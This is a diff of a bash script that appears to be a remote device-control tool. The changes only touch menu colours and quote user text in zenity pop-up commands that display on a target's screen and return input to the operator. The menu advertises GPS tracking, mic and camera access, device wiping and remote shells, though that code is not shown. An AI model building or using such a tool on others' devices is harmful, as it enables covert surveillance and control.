@@ -126,7 +126,7 @@ fi
 tput sgr0                                       # 
 echo -e "\e[31m_________________________[ \e[97mChoose Your Options \e[31m]________________________"
 echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-echo -e "\E[1;34m===\e[97m[1] \e[90mSend A Message       \e[97m [SEND MESSAGE TO SCREEN]  \E[1;34m"
+echo -e "\E[1;34m===\e[97m[1] \e[36mSend A Message       \e[97m [SEND MESSAGE TO SCREEN]  \E[1;34m"
 tput sgr0                               # Reset colors to "normal."
 echo -e "\E[1;34m:::\e[97m[2] \e[32mHardware Controls    \e[97m [ENABLE/DISABLE HARDWARE]   \E[1;34m"
 tput sgr0
@@ -136,7 +136,7 @@ echo -e "\E[1;34m:::\e[97m[4] \e[95mLocation             \e[97m [PULL GPS DATA] 
 tput sgr0
 echo -e "\E[1;34m===\e[97m[5] \e[31mDevice Details       \e[97m [PULL DEVICE INFO]  \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m:::\e[97m[6] \e[90mAccess Controls      \e[97m [LOCK/UNLOCK DEVICE]   \E[1;34m"
+echo -e "\E[1;34m:::\e[97m[6] \e[36mAccess Controls      \e[97m [LOCK/UNLOCK DEVICE]   \E[1;34m"
 tput sgr0                               # Reset attributes.
 echo -e "\E[1;34m===\e[97m[7] \e[32mSituational Awareness\e[97m [MIC, CAMERA, & VIDEO ACCESS]  \E[1;34m"
 tput sgr0
@@ -146,7 +146,7 @@ echo -e "\E[1;34m===\e[97m[9] \e[95mWipe Device          \e[97m [LOOKS LIKE I'M 
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[10]\e[31mRemote Use           \e[97m [SPAWN SHELLs, MAKE CALLs, SEND SMS']   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m===\e[97m[11]\e[90mApps & Services      \e[97m [LIST APPS, START APPS/SERVICES]   \E[1;34m"
+echo -e "\E[1;34m===\e[97m[11]\e[36mApps & Services      \e[97m [LIST APPS, START APPS/SERVICES]   \E[1;34m"
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[12]\e[32mReboot               \e[97m [REBOOT DEVICE]   \E[1;34m"
 tput sgr0
@@ -183,55 +183,55 @@ do
             ;;
 		"Warning Pop Up Box")
 			read -p 'Set Text: ' usertext;
-            zenity --display=:0 --warning --text=$usertext --ellipsize
+            zenity --display=:0 --warning --text=\"$usertext\" --ellipsize
             echo -e "\E[1;34m::::: \e[97mWarning Message Has Been Displayed\E[1;34m:::::"
             ;; 
         "Error Pop Up Box")
             read -p 'Set Text: ' usertext;
-            zenity --display=:0 --error --text=$usertext --ellipsize
+            zenity --display=:0 --error --text=\"$usertext\" --ellipsize
             echo -e "\E[1;34m::::: \e[97mError Message Has Been Displayed\E[1;34m:::::"
             ;;
         "List Of Options Pop Up Box")
             read -p 'Set Text: ' usertext; read -p 'Set Column: ' usercol; read -p 'Set Option 1: ' userop1; read -p 'Set Option 2: ' userop2; read -p 'Set Option 3: ' userop3;
-            export DISPLAY=:0 && zenity --list --text=$usertext --column=$usercol: $userop1 $userop2 $userop3
+            export DISPLAY=:0 && zenity --list --text=\"$usertext\" --column=\"$usercol\": \"$userop1\" \"$userop2\" \"$userop3\"
             echo -e "\E[1;34m::::: \e[97mDialog Box Sent. User's Selection Will Return In Terminal\E[1;34m:::::"
             ;;
         "Entry Pop Up Box")
             read -p 'Set Text: ' usertext;
-            zenity --display=:0 --entry --text=$usertext
+            zenity --display=:0 --entry --text=\"$usertext\"
             echo -e "\E[1;34m::::: \e[97mEntry Message Box Has Been Displayed. User's Input Will Return In Terminal\E[1;34m:::::"
             ;;
         "Info Pop Up Box")
 			read -p 'Set Text: ' usertext;
-            zenity --display=:0 --info --text=$usertext
+            zenity --display=:0 --info --text=\"$usertext\"
             echo -e "\E[1;34m::::: \e[97mInfo Message Has Been Displayed\E[1;34m:::::"
             ;;  
         "Notification Bubble Pop Up Box")
 			read -p 'Set Text: ' usertext;
-            zenity --display=:0 --notification --text=$usertext
+            zenity --display=:0 --notification --text=\"$usertext\"
             echo -e "\E[1;34m::::: \e[97mNotification Bubble Pop Up Has Been Sent\E[1;34m:::::"
             ;;
         "Progress Bar Pop Up Box")
 			read -p 'Set Text: ' usertext;
-            zenity --display=:0 --progress --text=$usertext; --pulsate --no-cancel
+            zenity --display=:0 --progress --text=\"$usertext\"; --pulsate --no-cancel
             echo -e "\E[1;34m::::: \e[97mPulsate Progress Bar Pop Up Has Been Sent\E[1;34m:::::"
-            ;;   
+            ;; 
         "YES/NO Question Pop Up Box")
 			echo -e "\E[1;34m::::: \e[97mUser's Response Will NOT Be Returned In Terminal\E[1;34m:::::"
 			read -p 'Set Text: ' usertext;
-            zenity --display=:0 --question --text=$usertext; --ellipsize
+            zenity --display=:0 --question --text=\"$usertext\"; --ellipsize
             echo -e "\E[1;34m::::: \e[97mQuestion Pop Up Has Been Sent\E[1;34m:::::"
-            ;; 
+            ;;
         "Scale Pop Up Box")
 			echo -e "\E[1;34m::::: \e[97mPresents User With A Slider Scale. They Can Select Any Number In Your Set Range.\E[1;34m:::::"
 			read -p 'Set Text: ' usertext; read -p 'Set Initial Value: ' userval; read -p 'Set Minimum Value: ' usermin; read -p 'Set Maximum Value: ' usermax;
-            zenity --display=:0 --scale --text=$usertext --value=$userval --min-value=$usermin --max-value=$usermax
+            zenity --display=:0 --scale --text=\"$usertext\" --value=$userval --min-value=$usermin --max-value=$usermax
             echo -e "\E[1;34m::::: \e[97mScale Pop Ip Has Been Displayed. User's Input Will Return In Terminal.\E[1;34m:::::"
             ;; 
         "Text Info/Image Pop Up Box")
 			echo -e "\E[1;34m::::: \e[97mSet URL To Any Image You Want To Display\E[1;34m:::::"
 			read -p 'Set Checkbox Text: ' usertext; read -p 'Set URL To Load: ' userurl;
-            zenity --display=:0 --text-info --editable --checkbox=$usertext --html --auto-scroll --url=$userurl
+            zenity --display=:0 --text-info --editable --checkbox=\"$usertext\" --html --auto-scroll --url=$userurl
             echo -e "\E[1;34m::::: \e[97mText Info/Image Pop Up Has Been Sent. Any User Input Will Return In Terminal.\E[1;34m:::::"
             ;;
         "Main Menu")
